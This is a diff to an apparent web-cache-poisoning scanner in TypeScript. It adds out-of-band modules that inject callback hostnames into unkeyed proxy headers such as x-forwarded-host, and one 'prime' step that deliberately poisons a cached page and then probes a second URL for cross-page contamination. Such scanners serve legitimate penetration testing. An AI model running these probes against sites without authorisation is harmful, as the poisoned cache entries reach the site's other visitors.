@@ -2,6 +2,7 @@ import { createHash } from 'crypto';
 import { CachePoisonConfig, PoisonFinding, PoisonResult, DiffSignal, CacheKeyOracle } from './types';
 import { HttpClient, HttpResponse } from './http-client';
 import { rawHeaderRequest } from './raw-http';
+import { InteractshClient } from './oob';
 
 /**
  * CP-DoS payload classes → canonical ExploitClassification.
@@ -30,6 +31,7 @@ export class CachePoison {
   private config: CachePoisonConfig;
   public findings: PoisonFinding[] = [];
   private http: HttpClient;
+  private oob: InteractshClient | null = null;
 
   // CDN default-keyed headers to skip (from blog)
   private static CDN_KEYED_HEADERS: Record<string, Set<string>> = {
@@ -190,6 +192,11 @@ export class CachePoison {
   /** Wire the Stage-2 harvested wordlist (HCache/BigQuery-derived) — replaces synthetic fallback. */
   setHarvestedWordlist(wordlist: { fast: string[]; all: string[] }): void {
     this.config.wordlist = wordlist;
+  }
+
+  /** Wire the registered interactsh client; null disables OOB modules. */
+  setOob(client: InteractshClient | null): void {
+    this.oob = client;
   }
 
   async run(cachedUrls: Array<{ url: string }>, wordlistTier: 'fast' | 'all' = 'fast'): Promise<PoisonFinding[]> {
@@ -655,6 +662,95 @@ async testSingleHeader(header: string, baseline: HttpResponse): Promise<PoisonFi
 
     // 11. Cache key injection (Kettle web-cache-entanglement §cache-key-injection)
     await this.testCacheKeyInjection(url, baseHeaders);
+
+    // 12-13. OOB modules (no-op when OOB client absent)
+    await this.testOobHeaderInjection(url, baseHeaders);
+    await this.testCrossPageContamination(url, baseHeaders);
+  }
+
+  /**
+   * Collaborator-Everywhere-style header injection: send a small curated set
+   * of trusted-proxy headers whose value is a unique OOB payload host, then
+   * poll for a callback. A callback proves the edge/origin resolved (and
+   * often fetched) an attacker-controlled hostname from an unkeyed header.
+   */
+  private async testOobHeaderInjection(url: string, headers: Record<string, string>): Promise<void> {
+    if (!this.oob?.isReady()) return;
+    const oobHeaders = [
+      'x-forwarded-host', 'forwarded', 'x-host', 'origin',
+      'x-original-url', 'x-rewrite-url',
+    ];
+    const canaries: Array<{ name: string; payload: string }> = [];
+    for (const name of oobHeaders) {
+      const payload = this.oob.nextPayload();
+      try {
+        await this.http.get(url, { ...headers, [name]: payload });
+        canaries.push({ name, payload });
+      } catch {
+        continue; // header rejected at transport — try next
+      }
+    }
+    if (canaries.length === 0) return;
+    // Single bounded wait for the whole batch — one callback confirms the module.
+    const hit = await this.oob.waitForInteraction(10_000, 1_000);
+    if (hit) {
+      // Attribute to the payload whose label appears in the interaction, else first sent.
+      const fullId = hit.fullId ?? '';
+      const matched =
+        canaries.find((c) => fullId.includes(c.payload.split('.').slice(0, 2).join('.'))) ??
+        canaries[0];
+      this.findings.push({
+        inputType: 'header', inputName: matched.name, canary: matched.payload,
+        signals: {
+          bodyReflection: false, headerReflection: {}, statusChanged: false,
+          sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {},
+        },
+        oracle: {} as CacheKeyOracle,
+        classification: 'oob_callback',
+        attackClass: 'header_poison',
+        confidence: 'CONFIRMED',
+        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
+      });
+    }
+  }
+
+  /**
+   * Kettle blind cache poisoning (web-cache-entanglement §5.1): prime a
+   * cached URL with an OOB-valued unkeyed header, then fetch a *different*
+   * cached URL. A callback arriving from the second fetch proves a keyless
+   * internal cache cross-served the poisoned fragment.
+   */
+  private async testCrossPageContamination(url: string, headers: Record<string, string>): Promise<void> {
+    if (!this.oob?.isReady()) return;
+    const payload = this.oob.nextPayload();
+    try {
+      // Prime: poison whatever keyless layer will hold the header value.
+      await this.http.get(url, { ...headers, 'x-forwarded-host': payload });
+    } catch {
+      return;
+    }
+    // Distinct second page — interaction here = cross-page contamination.
+    const probeUrl = url.includes('?') ? `${url}&_cb=${Date.now()}` : `${url}?_cb=${Date.now()}`;
+    try {
+      await this.http.get(probeUrl, headers);
+    } catch {
+      return;
+    }
+    const hit = await this.oob.waitForInteraction(10_000, 1_000);
+    if (hit) {
+      this.findings.push({
+        inputType: 'header', inputName: 'x-forwarded-host', canary: payload,
+        signals: {
+          bodyReflection: false, headerReflection: {}, statusChanged: false,
+          sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {},
+        },
+        oracle: {} as CacheKeyOracle,
+        classification: 'cross_page_contamination',
+        attackClass: 'content_poison',
+        confidence: 'CONFIRMED',
+        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
+      });
+    }
   }
 
   private async testFragmentForwarding(url: string, headers: Record<string, string>): Promise<void> {
